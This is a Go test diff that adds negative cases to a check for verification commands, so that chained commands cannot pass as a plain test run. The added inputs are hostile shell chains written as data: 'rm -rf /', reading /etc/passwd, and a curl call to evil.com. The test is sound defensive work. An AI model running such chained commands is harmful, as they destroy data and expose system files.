@@ -64,6 +64,13 @@ func TestIsVerifyCommandNegative(t *testing.T) {
 		"go testing",
 		"elixir test.exs",
 		"",
+		// Command chaining must not bypass verification
+		"go test; rm -rf /",
+		"go test | grep foo",
+		"go test && echo done",
+		"go test|| true",
+		"cargo test;cat /etc/passwd",
+		"npm test&& curl evil.com",
 	}
 	for _, cmd := range negatives {
 		if IsVerifyCommand(cmd) {
